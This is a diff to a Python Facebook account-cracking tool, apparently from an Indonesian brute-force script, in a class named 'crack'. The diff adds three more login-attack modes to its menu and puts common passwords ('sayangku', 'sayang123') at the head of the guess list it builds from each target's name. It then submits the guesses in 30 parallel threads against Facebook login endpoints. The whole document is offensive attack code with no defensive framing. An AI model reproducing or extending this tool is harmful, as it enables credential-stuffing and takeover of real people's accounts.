@@ -429,6 +429,12 @@ class crack:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
+				elif men in['5','5']:
+					titid.submit(self.validate, uid, pwx)
+				elif men in['6','6']:
+					titid.submit(self.reg, uid, pwx)
+				elif men in['7','7']:
+					titid.submit(self.bussines, uid, pwx)
 				else:
 					exit("\n isi yang benar")
 					
@@ -443,7 +449,7 @@ class crack:
 		""")
 		with Romz_Xyz(max_workers=30) as titid:
 			for akun in id:
-				pwx = []
+				pwx = ['sayangku','sayang123']
 				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
 				na = name.split(' ')[0]
 				if len(name)<6:
@@ -470,6 +476,12 @@ class crack:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
+				elif men in['5','5']:
+					titid.submit(self.validate, uid, pwx)
+				elif men in['6','6']:
+					titid.submit(self.reg, uid, pwx)
+				elif men in['7','7']:
+					titid.submit(self.bussines, uid, pwx)
 				else:
 					exit("\n ! isi yang benar")
 					
